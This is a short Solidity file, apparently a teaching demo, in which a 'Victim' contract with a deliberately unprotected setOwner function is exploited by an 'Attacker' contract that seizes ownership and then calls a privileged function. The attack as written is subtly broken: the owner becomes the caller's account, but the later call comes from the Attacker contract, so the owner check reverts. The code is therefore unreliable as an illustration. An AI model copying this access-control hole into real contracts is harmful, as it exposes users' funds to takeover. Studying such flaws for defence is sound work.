pragma solidity >=0.4.19 <0.6.0;

contract Victim {
    address owner;

    function setOwner(address _newOwner) public {
        owner = _newOwner;
    }

    function executeTransaction() public view{
        require(msg.sender == owner);
        // 执行转账操作等
    }
}

contract Attacker {
    address victim;

    function setVictim(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        Victim(victim).setOwner(msg.sender); // 修改 victim 合约的 owner 变量为攻击者地址
        Victim(victim).executeTransaction(); // 调用 victim 合约的 executeTransaction 函数
    }
}
